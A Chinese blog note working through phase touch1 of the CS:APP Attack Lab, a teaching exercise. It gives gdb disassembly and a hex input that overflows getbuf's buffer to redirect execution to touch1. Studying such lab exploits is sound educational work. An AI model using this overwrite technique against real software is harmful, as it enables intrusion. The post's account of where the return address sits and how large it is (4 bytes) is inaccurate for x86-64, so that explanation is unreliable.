---
title: 'CS:APP - Attack Lab 笔记'
date: 2018-08-29 17:48:58
categories:
	- 学习笔记
tags:
	- CSAPP
	- C
	- 学习笔记
---

本次 Lab 是通过利用缓冲区溢出等漏洞来改变代码的行为

## touch1

touch1 不需要写汇编代码，只要利用一定长度的字符串修改函数的返回地址即可。

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

本来运行完 `getbuf` 函数后函数会返回 `test` 继续运行，但是我们可以通过为 `Gets` 函数提供过长的字符串，以覆盖原来的返回地址。

`getbuf` 函数首先申请了 `0x28 = 40` 字节的空间，假设此时 `$rsp = 0x100`，那么原本的函数返回地址应该在 `$rsp - 0x28` 处，占用 4 个字节。也就是说，如果我们提供 44 个字节长度的字符串，就能成功覆盖原本的函数返回地址。

所以答案应该是（其实不应该有换行的！）：

```markdown
00 00 00 00
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
c0 17 40 00 /* touch1 的入口地址 */
```

